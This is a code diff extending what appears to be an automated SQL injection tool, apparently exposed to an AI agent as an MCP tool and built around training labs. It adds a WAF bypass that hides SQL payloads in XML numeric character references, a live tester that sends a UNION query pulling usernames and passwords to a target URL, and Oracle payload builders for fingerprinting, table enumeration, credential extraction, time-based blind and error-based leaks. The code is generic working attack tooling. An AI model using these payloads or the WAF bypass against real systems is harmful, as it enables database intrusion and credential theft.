@@ -528,6 +528,187 @@ class AutoSQLi:
         return results
 
 
+# ---------------------------------------------------------------------------
+# XML Encoding Bypass (Lab #56: WAF blocks raw SQL but XML parser decodes entities)
+# ---------------------------------------------------------------------------
+
+def xml_encode_payload(payload: str) -> str:
+    """Encode SQL payload as XML numeric character references.
+
+    Lab #56: WAF blocks raw SQL keywords (UNION, SELECT, etc.) but the
+    back-end XML parser decodes numeric character references before passing
+    the value to the SQL query.
+
+    Example:
+        '1 UNION SELECT' ->
+        '&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;'
+    """
+    return ''.join(f'&#{ord(c)};' for c in payload)
+
+
+def xml_encode_payload_hex(payload: str) -> str:
+    """Encode SQL payload as XML hex character references.
+
+    Some parsers only decode hex entities.  Provides a second encoding
+    option when decimal entities are filtered.
+    """
+    return ''.join(f'&#x{ord(c):x};' for c in payload)
+
+
+def build_xml_sqli_body(value: str, tag: str = "productId",
+                        root: str = "stockCheck") -> str:
+    """Wrap a (possibly XML-encoded) value inside a minimal XML body.
+
+    Typical stock-check POST body:
+        <stockCheck><productId>1</productId></stockCheck>
+    """
+    encoded = xml_encode_payload(value)
+    return f"<{root}><{tag}>{encoded}</{tag}></{root}>"
+
+
+def test_xml_sqli(url: str, param: str = "productId",
+                  method: str = "POST", session=None,
+                  headers: dict = None) -> dict:
+    """Test for SQLi in XML context with numeric-character-reference bypass.
+
+    Workflow:
+      1. Send raw SQL payload (expect WAF block / 403 / error).
+      2. Send XML-encoded payload (expect bypass if vulnerable).
+      3. Compare response lengths / status codes.
+
+    Returns dict with keys: vulnerable, raw_status, encoded_status,
+    raw_length, encoded_length, technique.
+    """
+    import requests as _req
+    s = session or _req.Session()
+    h = {"Content-Type": "application/xml", **(headers or {})}
+
+    raw_payload = "1 UNION SELECT username, password FROM users--"
+    encoded_payload = xml_encode_payload(raw_payload)
+
+    raw_body = build_xml_sqli_body(raw_payload, tag=param)
+    enc_body = build_xml_sqli_body(encoded_payload, tag=param)
+
+    try:
+        raw_resp = s.request(method, url, data=raw_body, headers=h,
+                             timeout=10, verify=False, allow_redirects=False)
+        enc_resp = s.request(method, url, data=enc_body, headers=h,
+                             timeout=10, verify=False, allow_redirects=False)
+
+        raw_blocked = raw_resp.status_code in (403, 406, 429) or \
+                      len(raw_resp.text) < 10
+        enc_has_data = any(kw in enc_resp.text.lower()
+                          for kw in ["administrator", "password", "carlos", "admin"])
+
+        vulnerable = raw_blocked and enc_has_data and enc_resp.status_code == 200
+
+        return {
+            "vulnerable": vulnerable,
+            "technique": "xml_entity_bypass",
+            "raw_status": raw_resp.status_code,
+            "raw_length": len(raw_resp.text),
+            "encoded_status": enc_resp.status_code,
+            "encoded_length": len(enc_resp.text),
+            "encoded_preview": enc_resp.text[:300],
+            "encoded_payload": encoded_payload,
+        }
+    except Exception as e:
+        return {"vulnerable": False, "technique": "xml_entity_bypass",
+                "error": str(e)}
+
+
+# ---------------------------------------------------------------------------
+# Oracle DB Support
+# ---------------------------------------------------------------------------
+
+def get_oracle_payloads() -> dict:
+    """Oracle-specific SQLi payloads and syntax helpers.
+
+    Oracle quirks handled:
+      - Requires ``FROM dual`` for standalone SELECTs.
+      - Uses ``||`` for string concatenation (not ``+``).
+      - Uses ``--`` for line comments (no ``#``).
+      - ``ROWNUM`` replaces ``LIMIT``.
+      - ``v$version`` for version info.
+      - ``all_tables`` / ``all_tab_columns`` for schema enumeration.
+    """
+    return {
+        "comment": "--",
+        "string_concat": "||",
+        "error_trigger": "TO_CHAR(1/0)",
+        "time_delay": "DBMS_PIPE.RECEIVE_MESSAGE('a',10)",
+        "version": "SELECT banner FROM v$version WHERE ROWNUM=1",
+        "tables": "SELECT table_name FROM all_tables WHERE ROWNUM<=10",
+        "columns": (
+            "SELECT column_name FROM all_tab_columns "
+            "WHERE table_name='{table}' AND ROWNUM<=10"
+        ),
+        "extract": "SELECT {column} FROM {table} WHERE ROWNUM=1",
+        "dual_required": True,
+        "string_quote": "'",          # Oracle has no backtick
+        "error_keywords": ["ora-", "oracle", "quoted string not properly terminated"],
+    }
+
+
+def build_oracle_extract(column: str, table: str,
+                         username: str = "administrator") -> str:
+    """Build Oracle UNION extraction payload with ``FROM dual``.
+
+    Returns a subselect suitable for embedding in a UNION or boolean-based
+    payload.  Oracle requires ``FROM dual`` when the query has no natural
+    ``FROM`` clause.
+
+    Example output::
+
+        (SELECT username FROM users WHERE username='administrator')
+    """
+    # Use a subselect that Oracle can evaluate inside UNION position
+    return f"(SELECT {column} FROM {table} WHERE username='{username}')"
+
+
+def build_oracle_version_payload(columns: int = 2,
+                                 vuln_col: int = 0) -> str:
+    """Build a UNION payload to extract Oracle version via v$version."""
+    cols = ["NULL"] * columns
+    cols[vuln_col] = "(SELECT banner FROM v$version WHERE ROWNUM=1)"
+    return f"' UNION SELECT {','.join(cols)} FROM dual--"
+
+
+def build_oracle_table_enum_payload(columns: int = 2,
+                                    vuln_col: int = 0) -> str:
+    """Build a UNION payload to enumerate Oracle tables (XMLAgg trick)."""
+    # XMLAgg concatenates multiple rows into one XML string
+    cols = ["NULL"] * columns
+    cols[vuln_col] = (
+        "(SELECT XMLAgg(XMLELEMENT(e, table_name||',') ORDER BY table_name)"
+        ".getStringVal() FROM (SELECT table_name FROM all_tables WHERE ROWNUM<=50))"
+    )
+    return f"' UNION SELECT {','.join(cols)} FROM dual--"
+
+
+def build_oracle_credential_payload(table: str, user_col: str = "username",
+                                    pass_col: str = "password",
+                                    columns: int = 2) -> str:
+    """Build a UNION payload to extract credentials from an Oracle table."""
+    cols = ["NULL"] * columns
+    if columns >= 2:
+        cols[0] = user_col
+        cols[1] = pass_col
+    else:
+        cols[0] = f"{user_col}||':'||{pass_col}"
+    return f"' UNION SELECT {','.join(cols)} FROM {table} WHERE ROWNUM<=10--"
+
+
+def oracle_time_delay(seconds: int = 5) -> str:
+    """Return Oracle time-based blind payload."""
+    return f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds})--"
+
+
+def oracle_error_extract(query: str) -> str:
+    """Wrap a subquery in Oracle's TO_CHAR(1/0) to trigger an error leak."""
+    return f"' AND TO_CHAR(1/0)=({query})--"
+
+
 def auto_sqli_impl(base_url: str, param: str = "category",
                    method: str = "GET", headers: dict = None) -> dict:
     """Run automated SQLi scan. Entry point for MCP tool."""
